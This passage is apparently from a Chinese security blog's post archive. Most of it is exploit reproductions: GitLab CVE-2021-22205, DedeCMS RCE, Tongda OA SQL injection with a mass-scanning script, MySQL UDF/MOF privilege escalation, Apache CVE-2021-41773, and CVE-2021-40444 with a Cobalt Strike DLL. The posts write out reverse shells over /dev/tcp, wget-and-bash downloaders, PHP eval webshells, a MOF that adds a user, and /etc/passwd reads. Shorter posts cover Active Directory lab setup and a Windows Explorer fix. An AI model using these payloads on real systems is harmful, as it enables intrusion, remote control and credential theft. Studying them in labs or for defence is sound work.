⼦域控制器：sec.adlab.com\r子域控制器：\rIP：10.10.11.50\r子网掩码：255.255.255.0\r默认网光：10.10.11.254\r首选DNS：10.10.10.50\r 3、安装域 打开服务器管理器，添加角色和功能。\n出现“添加角色和功能”界面，下一步 。\n根据提示操作，下一步。\n选择添加AD域服务（Active Directory 域服务），同时添加所需功能。\n根据提示操作，下一步\n根据提示操作，下一步\n根据提示操作，安装\n等待安装完成\n安装完成\n4、配置域 点击服务器管理器左侧“AD DS” 、点击黄色提示部分中的更多。\n部署的时候需要设置:\n选择部署操作：将新域添加到现有林选择域类型：⼦域 ⽗域名：adlab.com 子域名：sec.adlab.com 凭据：填写⽗域的⽤户名密码即可\n输入密码，点击下一步\n域功能级别：windows Server 2012指定域控制器功能和站点信息：域名系统（DNS）服务器 、全局编录 填写新的DSRM密码:Redteam.com\r 默认下一步\nNetBIOS 我们默认用系统设置的就好，点击”下一步“\n默认下一步\n默认下一步\n来到”安装”界面，等待安装成功机器会自动重启：\n配置好之后，在子域中ping 父域\n至此子域配置完成\n三、树域搭建 搭建树域的操作系统只能大于等于根域的操作系统，不能低于根域的操作系统，这里我推荐都用相同的操作系统。\n1、修改主机名 2、设置DNS ⽗域控制器：adlab.com ⼦域控制器：ad.com\r子域控制器：\rIP：10.10.12.50\r子网掩码：255.255.255.0\r默认网光：10.10.12.254\r首选DNS：10.10.10.50\r 3、安装域 出现“添加角色和功能”界面，下一步 。\n根据提示操作，下一步。\n根据提示操作，下一步。\n选择添加AD域服务（Active Directory 域服务），同时添加所需功能。\n根据提示操作，下一步\n根据提示操作，下一步\n根据提示操作，安装\n点击\u0026quot;将此服务器提升为域控制器\u0026quot;\n4、配置域 根据以下顺序填写\n1.选择\u0026quot;树域\u0026quot;\r2.先输入凭据，这里要输入域名adlab.com\\sysadmin\r3.输入新域名\r 填写密码，下一步 。\n提示DNS无法创建，不用管，继续下一步\n根据提示操作，下一步\n安装路径，默认，下一步\n查看选项，默认，下一步\n点击安装 。此过程可能会报错，提示登陆用户没有设置密码，去设置给当前登陆用户（Administrator）设置一个密码，然后回来点击 “重新运行先决条件检查” 即可！\n5、检查配置 安装好之后，ping根域\nping dc1.adlab.com\n两者之间也是互相信任的\n说明两个域是互相信任的\nbug汇总 1.域名无法解析 通过树域ping根域ping不通或者找不到域名，在根域的DNS中新增一个条件转发器\n若不行在另外一个域中的DNS中新增一个条件转发器\n2.无法联系到一个主域控制器（PDC）仿真器。 在dc上运行命令dcdiag /v，看看有无任何错误信息。 请运行命令repadmin /syncall，查看AD复制是否正常。\n参考地址\nhttps://social.technet.microsoft.com/Forums/msonline/en-US/606538d5-18dc-409b-b21a-83a29a654681/26080278613285231995210401996820010200272249525511210462212065?forum=windowsserversystemzhchs\r 3.找不到命名信息 点击域内服务时，提示以下内容\n打开服务，检查Netlogon服务的状态\n如果服务未启动或者暂停等，则需要手动将该服务启动\n参考地址 https://mp.weixin.qq.com/s/2GKMFKmjCF_vht8hKl4iFw\rhttps://www.bilibili.com/read/cv13367444\rhttps://sec-in.com/article/1140\rhttps://www.office26.com/windows/windows_17514.html\rhttps://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/deploy/install-a-new-windows-server-2012-active-directory-child-or-tree-domain--level-200-\r ","id":27,"section":"posts","summary":"主机信息 用途 操作系统 主机名 域名 IP地址 DNS 根域 windows 2012 DC1 adlab.com 10.10.10.50 127.0.0.1 辅域 windows 2019 DC4 adlab.com 10.10.10.20 127.0.0.1和10.10.10.50 子域 windows 2012 DC2 sec.adlab.com 10.10.11.50 127.0.0","tags":["内网环境搭建"],"title":"搭建大型域环境(根域、子域、辅域、树域)","uri":"https://ad-calcium.github.io/2021/10/%E6%90%AD%E5%BB%BA%E5%A4%A7%E5%9E%8B%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%A0%B9%E5%9F%9F%E5%AD%90%E5%9F%9F%E8%BE%85%E5%9F%9F%E6%A0%91%E5%9F%9F/","year":"2021"},{"content":"0x01 漏洞背景 GitLab是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。\n近日，GitLab发布安全更新公告，修复了GitLab社区版(CE)和企业版(EE)存在一个远程命令执行漏洞，漏洞CVE编号：CVE-2021-22205。攻击者可利用该漏洞在目标服务器上执行任意命令。建议受影响用户将GitLab升级至最新版本进行防护，做好资产自查以及预防工作，以免遭受黑客攻击。\n0x02 漏洞描述 该漏洞影响从11.9开始的所有版本，由于Gitlab未正确验证传递到文件解析器的图像文件从而导致命令执行。攻击者可构造恶意请求利用该漏洞在目标系统执行任意指令，最终导致Gitlab服务器被控制。\n0x03 影响版本 11.9 \u0026lt;= Gitlab CE/EE \u0026lt;= 13.8.7\r13.9 \u0026lt;= Gitlab CE/EE \u0026lt;= 13.9.5\r13.10 \u0026lt;= Gitlab CE/EE \u0026lt;= 13.10.2\r 0x04 漏洞环境搭建 docker搭建（需要8G内存，不然访问返回502）\ndocker run -itd \\\r-p 9980:80 \\\r-p 9922:22 \\\r-v /usr/local/gitlab-test/etc:/etc/gitlab \\\r-v /usr/local/gitlab-test/log:/var/log/gitlab \\\r-v /usr/local/gitlab-test/opt:/var/opt/gitlab \\\r--restart always \\\r--privileged=true \\\r--name gitlab-test \\\rgitlab/gitlab-ce:13.10.2-ce.0\r 安装好之后，首次访问http://ip:9980提示设置管理员密码，由于默认情况下注册用户需要管理员审批，为了方便测试\n设置新用户注册之后不需要审批\nhttp://IP:9980/admin/application_settings/general#js-signup-settings\r 0x05 漏洞分析  当上传图片文件时，Gitlab Workhorse将扩展名为jpg|jpeg|tiff的文件通过ExifTool删除任何非白名单标记。 其中一个支持的格式是DjVu。当解析DjVu注释时，标记被赋值为convert C escape sequences。 作者的文章：https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html （详情请看此处）  #convert C escape sequences 出现以下代码\r$tok = eval qq{\u0026quot;$tok\u0026quot;};\r 0x06 漏洞复现 v11版本需要授权登陆或者注册新用户进入后台,新建项目进行上传\rv12版本存在未授权,管理员登陆或者注册新用户进入后台,新建项目进行上传\rv13版本存在未授权,管理员登陆,默认情况允许注册新用户,但还需要管理员审核后才能进入后台\r 1.账号注册 首先需要一个Gitlab平台的一个账户及密码（有些公司的Gitlab平台是允许注册的）\n2.上传图片 登录后到个人主页，找到Snippets\n在Description字段中，点击\u0026quot;Attach a file\u0026quot;，上传已经写好命令的图片\n3.制作DjVu的exp 此处需要上传DjVu格式图片（即Exp）\napt安装DjVuapt-get install djvulibre-bin -y\nDjVu格式图片制作方式如下，准备好将要压缩图片的文本\n(metadata\r(Copyright \u0026quot;\\\r\u0026quot; . qx{wget http://192.168.3.248/1.sh \u0026amp;\u0026amp; bash 1.sh}. \\\r\u0026quot; b \u0026quot;) )\r djvumake rce.djvu INFO=0,0 BGjp=/dev/null ANTa=rce.txt \u0026amp;\u0026amp; mv rce.djvu rce.jpg\r 3.python开启http服务 python3 -m http.server 80\r 4.新建反弹shell脚本 在桌面上新建1.sh\nbash -i \u0026gt;\u0026amp; /dev/tcp/192.168.3.248/9999 0\u0026gt;\u0026amp;1\r 5.nc监听 nc -lvvp 9999\r 6.上传exp 7.执行命令 脚本自动化 https://github.com/r0eXpeR/CVE-2021-22205\r 1.使用nc监听 nc -lvvp 9999\r 2.运行脚本 python3 CVE-2021-22205.py http://10.108.3.177:9980/ \u0026quot;wget http://192.168.3.248/1.sh \u0026amp;\u0026amp; bash 1.sh\u0026quot;\r 3.成功反弹shell 0x07 参考地址 https://www.cnblogs.com/ybit/p/14918949.html\rhttp://blog.seals6.top/index.php/archives/14/\r ","id":28,"section":"posts","summary":"0x01 漏洞背景 GitLab是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。 近日，GitLab发","tags":["漏洞复现","web"],"title":"GITLAB 远程命令执行漏洞(CVE-2021-22205)","uri":"https://ad-calcium.github.io/2021/10/gitlab-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2021-22205/","year":"2021"},{"content":"0x01 前言 DedeCMS是国内专业的PHP网站内容管理系统-织梦内容管理系统，采用XML名字空间风格核心模板：模板全部使用文件形式保存，对用户设计模板、网站升级转移均提供很大的便利，健壮的模板标签为站长DIY自己的网站提供了强有力的支持。高效率标签缓存机制：允许对同类的标签进行缓存，在生成 HTML的时候，有利于提高系统反应速度，降低系统消耗的资源。模型与模块概念并存：在模型不能满足用户所有需求的情况下，DedeCMS推出一些互动的模块对系统进行补充，尽量满足用户的需求。众多的应用支持：为用户提供了各类网站建设的一体化解决方案。\n该漏洞是由于DedeCMS存在变量覆盖漏洞，攻击者可利用该漏洞在未授权的情况下，构造恶意代码配合模板文件包含功能造成远程命令执行攻击，最终获取服务器最高权限。\n0x02 影响版本 正式版：\u0026lt; v5.7.8(仅SQL注入) 内测版：= v5.8.1_beta  0x03 利用条件  用户认证：未授权 触发方式：远程  0x04 漏洞验证 访问以下链接：http://目标IP/data/admin/ver.txt\n访问后返回DedeCMS版本更新时间，对比DedeCMS系统补丁更新完整列表：\nhttp://www.dedecms.com/pl/\n可查看对应的版本。20210926（对应DedeCMS v5.7.8版）之后（包含该本版）的版本将不受该漏洞影响。\n访问http://IP/plus/recommend.php并抓包\n赋值Referer为coldwater，查看写入的模板内容\n现在我们将Referer替换为注入代码，当然我们如果直接写一些常见的危险函数是不行的，因为在dedetemplate.class.php中，存在CheckDisabledFunctions函数，CheckDisabledFunctions函数在WriteCache中被调用，会对内容进行一个检测。\n但是assert不在这个黑名单里面，且对get和post请求中的字符没有过滤，我们可以利用assert或者call_user_func执行任意代码。\n除此之外，也并没有对\u0026quot;\u0026quot;进行检测，在php中，\u0026quot;\u0026quot;中的字符串可以被解析为函数，此外对反引号``也没有检测\n成功执行命令。\n以下（非详尽的）路径可以到达该漏洞：\n/plus/flink.php?dopost=save /plus/users_products.php?oid=1337 /plus/download.php?aid=1337 /plus/showphoto.php?aid=1337 /plus/users-do.php?fmdo=sendMail /plus/posttocar.php?id=1337 /plus/vote.php?dopost=view /plus/carbuyaction.php?do=clickout /plus/recommend.php  getshell 尝试往目标服务器写入一句话木马\n构造如下payload\nGET /plus/recommend.php?c='echo \u0026quot;\u0026lt;?php @eval($_POST[cmd]);?\u0026gt;\u0026quot;\u0026gt;shell.php' HTTP/1.1 Host: 192.168.3.238 Referer: \u0026lt;?php $b = `$c`; echo \u0026quot;\u0026lt;pre\u0026gt;$b\u0026lt;/pre\u0026gt;\u0026quot;;/*  写入shell失败\n构造如下payload\nGET /plus/recommend.php?c=echo \u0026quot;\u0026lt;?php @eval($_POST[cmd]);?\u0026gt;\u0026quot;\u0026gt;shell.php HTTP/1.1 Host: 192.168.3.238 Referer: \u0026lt;?php $b = `$c`; echo \u0026quot;\u0026lt;pre\u0026gt;$b\u0026lt;/pre\u0026gt;\u0026quot;;/*  同样写入失败\n执行系统命令net user\nGET /plus/recommend.php?c=net user HTTP/1.1 Host: 192.168.3.238 Referer: \u0026lt;?php $b = `$c`; echo \u0026quot;\u0026lt;pre\u0026gt;$b\u0026lt;/pre\u0026gt;\u0026quot;;/*  执行命令失败\n猜测是执行的命令中包含空格，想办法bypass空格\n此处可以用%09代替空格，需要PHP环境\n构造如下payload\nGET /plus/recommend.php?c=echo%09123\u0026gt;s.php HTTP/1.1 Host: 192.168.3.238 Referer: \u0026lt;?php $b = `$c`; echo \u0026quot;\u0026lt;pre\u0026gt;$b\u0026lt;/pre\u0026gt;\u0026quot;;/*  写入一句话\nGET /plus/recommend.php?c=echo%09\u0026quot;\u0026lt;?php%09@eval($_POST[cmd]);?\u0026gt;\u0026quot;\u0026gt;shell.php HTTP/1.1 Host: 192.168.3.238 Referer: \u0026lt;?php $b = `$c`; echo \u0026quot;\u0026lt;pre\u0026gt;$b\u0026lt;/pre\u0026gt;\u0026quot;;/* Content-Length: 2  成功写入shell.php\n用蚁剑连接\n0x05 参考地址 https://mp.weixin.qq.com/s/GSudZ7T8rl2yx5Tpkk6pHQ https://xz.aliyun.com/t/10331 https://blog.csdn.net/xuu4561/article/details/120609960  ","id":29,"section":"posts","summary":"0x01 前言 DedeCMS是国内专业的PHP网站内容管理系统-织梦内容管理系统，采用XML名字空间风格核心模板：模板全部使用文件形式保存，对用户设","tags":["漏洞复现","web"],"title":"Dedecms_V5.8.1 RCE","uri":"https://ad-calcium.github.io/2021/10/dedecms_v5.8.1-rce/","year":"2021"},{"content":"0x01 前言 通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。\n通达oa前台存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息，服务器权限等。\n0x02 漏洞版本 通达oa 11.9\r 0x03 fofa语法 icon_hash=\u0026quot;-759108386\u0026quot;或者 \u0026quot;tongda.ico\u0026quot;\r 0x04 漏洞复现 查询online的uid与sid的字段。通过恶意的payload构造\n/general/reportshop/utils/get_datas.php?USER_ID=OfficeTask\u0026amp;PASSWORD=\u0026amp;col=1,1\u0026amp;tab=5 whe\\re 1={`\\='` 1} un\\ion (s\\elect user_name,byname fr\\om user whe\\re 1\\={`=` 1})-- '\r 此命令可以成功获取到在线用户的cookie，从而进行复制用户cookie，自定义利用工具进行后台文件上传漏洞进行getshell\n/general/reportshop/utils/get_datas.php?USER_ID=OfficeTask\u0026amp;PASSWORD=\u0026amp;col=1,1\u0026amp;tab=5 whe\\re 1={`\\='` 1} un\\ion (s\\elect uid,sid fr\\om user_online whe\\re 1\\={`=` 1})-- '\r 最终使用工具进行上传shell\n使用冰蝎进行连接，成功获取到webshell\n准备删个马准备跑路，发现这才是跑马场\n马子太多了，可怜的通达oa\n0x05 批量poc # -*- coding: utf-8 -*-\r# @Date :2021/10/11 22:36\r# @Author :AD钙奶\rfrom queue import Queue\rfrom threading import Thread, activeCount\rimport requests\rimport ssl\rfrom urllib3.exceptions import InsecureRequestWarning\rssl._create_default_https_context = ssl._create_unverified_context\rrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\r# 漏洞版本\r# 通达oa 11.9\rdef _POC(target_url):\rcore_url = target_url + \u0026quot;/general/reportshop/utils/get_datas.php?USER_ID=OfficeTask\u0026amp;PASSWORD=\u0026amp;col=1,1\u0026amp;tab=5 whe\\\\re 1={`\\='` 1} un\\ion (s\\elect uid,sid fr\\om user_online whe\\\\re 1\\={`=` 1})-- '\u0026quot;\rdata = {\r'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',\r'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',\r'Connection': 'close',\r'Accept-Encoding': 'gzip, deflate',\r'Content-Length': '1244',\r'Content-Type': 'application/x-www-form-urlencoded'\r}\rtry:\rresponse = requests.get(url=core_url, timeout=10, data=data, verify=False)\rif response.status_code == 200 and '1;1' in response.text:\rprint(\u0026quot;\\033[36m[+] 存在SQL注入漏洞 : {} \\033[0m\u0026quot;.format(target_url))\rsave_vuln(target_url)\rexcept Exception as e:\rpass\rdef get_file_url():\rwith open('url.txt', 'r', encoding='utf-8') as f:\rurls = f.readlines()\rurl = [url.strip() for url in urls if url and url.strip()]\rreturn url\rdef save_vuln(url):\rurls = url + '\\n'\rwith open('result.txt','a') as ff:\rff.write(urls)\rdef main():\rurl = get_file_url()\rqueue = Queue(maxsize=0)\rfor urls in url:\rqueue.put(urls)\rwhile queue.qsize() \u0026gt; 0:\rif activeCount() \u0026lt;= 50:\rThread(target=_POC, args=(queue.get(),)).start()\rif __name__ == '__main__':\rmain()\r ","id":30,"section":"posts","summary":"0x01 前言 通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践","tags":["漏洞复现"],"title":"通达oa11.9前台注入","uri":"https://ad-calcium.github.io/2021/10/%E9%80%9A%E8%BE%BEoa11.9%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5/","year":"2021"},{"content":"MySQL UDF提权 1.漏洞原理 UDF (user defined function)，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充，其实就像使用本地MySQL函数，如 user() 或 concat() 等。 假设我的UDF文件名为 udf.dll，存放在MySQL安装目录的 lib/plugin 目录下。在 udf.dll 文件中，定义了名为 sys_eval 的mysql函数，该函数可以执行系统任意命令。但是如果现在就打开MySQL命令行，使用 select sys_eval('dir'); 的话，系统会返回sys_eval() 函数未定义。因为仅仅是把 udf.dll 放到了 lib/plugin 目录下，并没有引入。类似于面向对象编程时引入包一样，如果没有引入包，那么这个包里的类你是用不了的。\n2.实例用法 create function sys_eval returns string soname 'udf.dll';\r 只有两个变量：\n 一个是 function_name(函数名)，此处我们引入的函数是 sys_eval 另一个是 share_library_name (共享包名称)，即 udf.dll  引入sys_eval函数之后，就可以使用了\nselect * from mysql.func where name = 'sys_eval'; # 查看创建的sys_eval函数\rselect sys_eval('whoami'); # 执行命令\r 3.提权前提  MySQL必须是root权限 secure_file_priv=(未写路径) 将udf.dll写入到mysql的plugin目录下（以MySQL\u0026gt;=5.1为例）  4.实验 在cmd中输入mysql -uroot -p，再输入密码root，进入mysql 首先查看数据库的版本\nselect version();\r 查看secure_file_priv的值\nshow global variables like 'secure%';\r当 secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出，此时无法提权\r当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权\r当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权\r 此处secure_file_priv的值为空，可以提权\n查看plugin的目录名称\nshow variables like 'plugin%';\r 查询目录的绝对路径\nselect @@plugin_dir\r 查看系统架构\nshow variables like '%compile%';\r 可以看到该主机是64位的\n接下来将桌面上的dll文件写入plugin目录，并创建函数\nselect 0x十六进制内容 into dumpfile \u0026quot;plugin的目录\\\\udf.dll\u0026quot;\r 将udf.dll文件转化为十六进制\nselect hex(load_file('C:\\\\Users\\\\Administrator\\\\Desktop\\\\udf.dll')) into dumpfile 'C:\\\\Users\\\\Administrator\\\\Desktop\\\\udf.txt';\r此处要用 \\\\ 对 \\ 转义\r 再把生成的udf.txt里面的十六进制内容写入C:\\Program Files\\MySQL\\MySQL Server 5.5\\lib\\plugin\\udf.dll\nselect 0x4D5A90000300000 ...... into dumpfile 'C:\\\\Program Files\\\\MySQL\\\\MySQL Server 5.5\\\\lib\\\\plugin\\\\udf.dll';\r 成功将udf.dll写入目标路径\n导入udf函数\ncreate function sys_eval returns string soname 'udf.dll'; # 导入sys_eval函数\rselect * from mysql.func where name = 'sys_eval'; # 查看创建的sys_eval函数\r 执行系统命令\nselect sys_eval('whoami');\rselect sys_eval('ipconfig');\r MySQL MOF提权 1.漏洞原理 mof指的是托管对象格式，是一种文件类型，它（nullevt.mof）在 C:\\WINDOWS\\system32\\wbem\\mof\\ 路径下，将会每隔一段时间以system权限执行一次，我们可以通过root权限下的mysql将该文件写入到路径下，以达到提权的效果。\nMOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。\n2.提权前提  secure_file_priv=(未写路径) mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录，且允许外连 操作系统为Windows，版本不宜过高  3.实验 在cmd中输入mysql -uroot -p，再输入密码root，进入mysql 首先查看数据库的版本\nselect version();\r 查看secure_file_priv的值\nshow global variables like 'secure%';\r当 secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出，此时无法提权\r当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权\r当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权\r 此处secure_file_priv的值为空，可以尝试提权\n接着在cmd执行命令net user，查看当前系统的用户 此时系统的用户为Adminsitrator和Guest\nnullevt.mof的内容为\n#pragma namespace(\u0026quot;\\\\\\\\.\\\\root\\\\subscription\u0026quot;)\rinstance of __EventFilter as $EventFilter\r{\rEventNamespace = \u0026quot;Root\\\\Cimv2\u0026quot;;\rName = \u0026quot;filtP2\u0026quot;;\rQuery = \u0026quot;Select * From __InstanceModificationEvent \u0026quot;\r\u0026quot;Where TargetInstance Isa \\\u0026quot;Win32_LocalTime\\\u0026quot; \u0026quot;\r\u0026quot;And TargetInstance.Second = 5\u0026quot;;\rQueryLanguage = \u0026quot;WQL\u0026quot;;\r};\rinstance of ActiveScriptEventConsumer as $Consumer\r{\rName = \u0026quot;consPCSV2\u0026quot;;\rScriptingEngine = \u0026quot;JScript\u0026quot;;\rScriptText =\r\u0026quot;var WSH = new ActiveXObject(\\\u0026quot;WScript.Shell\\\u0026quot;)\\nWSH.run(\\\u0026quot;net.exe user mof 123456 /add\\\u0026quot;)\u0026quot;;\r};\rinstance of __FilterToConsumerBinding\r{\rConsumer = $Consumer;\rFilter = $EventFilter;\r};\r 执行nullevt.mof，会执行net.exe user mof 123456 /add命令，创建一个新用户。\n利用MySQL把桌面上的nullevt.mof上传到C:/WINDOWS/system32/wbem/mof/nullevt.mof\nselect load_file('C:\\\\Documents and Settings\\\\Administrator\\\\桌面\\\\nullevt.mof') into dumpfile 'C:\\\\WINDOWS\\\\system32\\\\wbem\\\\mof\\\\nullevt.mof';\r 上传mof文件成功。\n等待几秒钟，再次net user查看系统用户 发现多了一个mof，成功创建了一个新用户。\n","id":31,"section":"posts","summary":"MySQL UDF提权 1.漏洞原理 UDF (user defined function)，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充，其实就像使用本地MySQL","tags":["mysql提权"],"title":"mysql提权","uri":"https://ad-calcium.github.io/2021/10/mysql%E6%8F%90%E6%9D%83/","year":"2021"},{"content":"0x01 漏洞描述 在 Apache HTTP Server 2.4.49 中对路径规范化所做的更改中发现了一个缺陷。早期版本中并没有 ap_normalize_path 这个函数，该函数是在v2.4.49版本中引入的，正是这个函数导致了 目录穿越。\n0x02 影响版本 Apache HTTP Server 2.4.49\n0x03 漏洞环境 https://github.com/blasty/CVE-2021-41773\rhttps://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013\rhttps://github.com/1nhann/CVE-2021-41773\r 0x04 漏洞复现 1.读取文件 curl -s --path-as-is \u0026quot;http://10.108.0.90:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\u0026quot;\r 2.执行命令 curl -s --path-as-is -d \u0026quot;echo Content-Type: text/plain; echo; id\u0026quot; \u0026quot;http://10.108.0.90:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh\u0026quot;\r 3.反弹shell 在服务器上使用nc监听\nnc -lvvp 9998\r 在服务器中写入反弹shell命令\nPOST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1\rHost: 10.108.0.90:12345\rUser-Agent: curl/7.68.0\rAccept: */*\rContent-Length: 68\rContent-Type: application/x-www-form-urlencoded\rConnection: close\rdata=;echo \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.108.0.90/9998 0\u0026gt;\u0026amp;1\u0026quot;\u0026gt;\u0026gt; /tmp/xxx.sh\r 执行脚本\nPOST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1\rHost: 10.108.0.90:12345\rUser-Agent: curl/7.68.0\rAccept: */*\rContent-Length: 53\rContent-Type: application/x-www-form-urlencoded\rConnection: close\recho Content-Type: text/plain; echo; bash /tmp/xxx.sh\r 成功反弹shell\n","id":32,"section":"posts","summary":"0x01 漏洞描述 在 Apache HTTP Server 2.4.49 中对路径规范化所做的更改中发现了一个缺陷。早期版本中并没有 ap_normalize_path 这个函数，该函数是在v2.4.49版本中引入的，正是这个函数","tags":["漏洞复现"],"title":"Apache（CVE-2021-41773）漏洞复现","uri":"https://ad-calcium.github.io/2021/10/apache-httpd%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-41773/","year":"2021"},{"content":"起因 在Win10使用过程中，总是会出现无法新建文件夹或者新建文件无法自动刷新，需要手动刷新才能解决。\n问题 什么问题呢 ？在文件夹下 新建或者删除一个文件，需要手动刷新才能显示。无法自动刷新显示做出更改的条目。\n问题其他近似描述：\n新建文件夹不显示，需要手动刷新显示；\r删除文件夹依然存在，需要手动刷新消失；\r保存文件不显示，需要手动刷新显示；\r 机器环境 Win10 64位\r 解决方法 通过百度，我发现网络上常见的是解决方法是前面三种，按照他们的方法执行修改后，文件夹下文件图标还是无法自动更新，都不好用。于是我尝试用英文去谷歌搜索，结果一下就解决了这个问题。\n下面简单阐述一下解决问题中使用的一些解决方法。\n方法一：修改注册表UpdateMode HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Update\\UpdateMode 的Dword值修改为0\r 效果：不行\n方法二：重置文件夹选项 在资源管理器下，依次选择查看-选项-查看-重置文件夹；或查看-选项-查看-还原默认值；\r 效果：不行\n方法三：Unpin未连接的网络位置 因为我的电脑有默认Pin一些网络位置的存储，但是可能那些存储位置已经不存在了，所以导致自动刷新失败，所以需要我们将那些网络位置Unpin掉。\r 效果：不行\n方法四：修改注册表Instance HKEY_CLASSES_ROOT\\Wow6432Node\\CLSID\\{BDEADE7F-C265-11D0-BCED-00A0C90AB50F}\\Instance 下创建一个Dword字段DontRefresh ，并配置为0\r 如果没有对应字段，可自行创建，具体方法可以参考下面这篇文章\n我这是基于64位的 具体还有基于32位的:https://answers.microsoft.com/en-us/windows/forum/windows_10-files/win-10-64-bit-file-explorer-auto-refresh/703492e6-dffb-4344-9699-7e41b2c4ddee\n效果：可行\n参考地址：\nhttps://blog.csdn.net/weixin_41555892/article/details/108263145\r ","id":33,"section":"posts","summary":"起因 在Win10使用过程中，总是会出现无法新建文件夹或者新建文件无法自动刷新，需要手动刷新才能解决。 问题 什么问题呢 ？在文件夹下 新建或者删除一","tags":["Win10相关"],"title":"解决Win10 文件夹下无法自动刷新的问题","uri":"https://ad-calcium.github.io/2021/09/%E8%A7%A3%E5%86%B3win10-%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E6%97%A0%E6%B3%95%E8%87%AA%E5%8A%A8%E5%88%B7%E6%96%B0%E7%9A%84%E9%97%AE%E9%A2%98/","year":"2021"},{"content":"0x01 漏洞描述 CVE-2021-40444：微软MSHTML引擎存在代码执行漏洞，攻击者通过精心制作包含恶意ActiveX的Offcie文档，诱导用户打开，从而实现远程代码执行。当用户主机启用了ActiveX控件，攻击者可通过该漏洞控制受害者主机。\n0x02 影响版本 全版本\n0x03 漏洞工具 poc下载地址\nhttps://github.com/lockedbyte/CVE-2021-40444\r 0x04 样本分析 样本下载\nhttps://bazaar.abuse.ch/sample/938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52/\r 下载样本，将docx改成zip，使用zip解压即可\n可以看出文件中引用了mhtml，然后Windows默认浏览器执行ActiveX最后造成代码执行。\n\\word\\_rels\\document.xml.rels\r 可以发现其是指向文件的更新链接\n0x05 复现 1.弹计算器 安装lcab\napt-get install lcab\r 运行脚本生成word文档\npython3 exploit.py generate test/calc.dll http://\u0026lt;SRV IP\u0026gt;\r 运行脚本监听80端口，默认为srv目录\npython3 exploit.py host 80\r 打开word文档，即可弹出计算器\n弹计算器肯定是不够的，不如来上线个cs\n2.上线cs 先使用cs生成powershell\n将生成的powershell代码复制到下面\n#include \u0026quot;pch.h\u0026quot;\r#include \u0026quot;windows.h\u0026quot;\r#include \u0026lt;cstdlib\u0026gt;\rvoid exec(void) {\rsystem(\u0026quot;powershell -nop -w hidden -encodedcommand xxxxx\u0026quot;);\rreturn;\r}\rBOOL WINAPI DllMain(\rHINSTANCE hinstDLL,\rDWORD fdwReason,\rLPVOID lpReserved)\r{\rswitch (fdwReason)\r{\rcase DLL_PROCESS_ATTACH:\rexec();\rbreak;\rcase DLL_THREAD_ATTACH:\rbreak;\rcase DLL_THREAD_DETACH:\rbreak;\rcase DLL_PROCESS_DETACH:\rbreak;\r}\rreturn TRUE;\r}\r 使用vs2019编译dll\n将编译后的dll文件复制到test目录\n运行脚本生成word文档\npython3 exploit.py generate test/Dll1.dll http://10.108.3.157\r 监听80端口，点击启动编辑（由于是从网上下载的文件会有以下提示）\npython3 exploit.py host 80  看到成功有访问记录\ncs成功上线\n参考地址\nhttps://mp.weixin.qq.com/s/4h8nNW3FEKmEltg6eUgopg\rhttps://mp.weixin.qq.com/s/hjjLKQCiaVUKWOw1jzQE9A\r ","id":34,"section":"posts","summary":"0x01 漏洞描述 CVE-2021-40444：微软MSHTML引擎存在代码执行漏洞，攻击者通过精心制作包含恶意ActiveX的Offcie文档，诱","tags":["漏洞复现","钓鱼"],"title":"CVE-2021-40444 漏洞复现","uri":"https://ad-calcium.github.io/2021/09/cve-2021-40444%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","year":"2021"},{"content":"SocksOverRDP  项目地址：https://github.com/nccgroup/SocksOverRDP  SocksOverRDP 可以将 SOCKS 代理的功能添加到远程桌面服务，它使用动态虚拟通道，使我们能够通过开放的 RDP 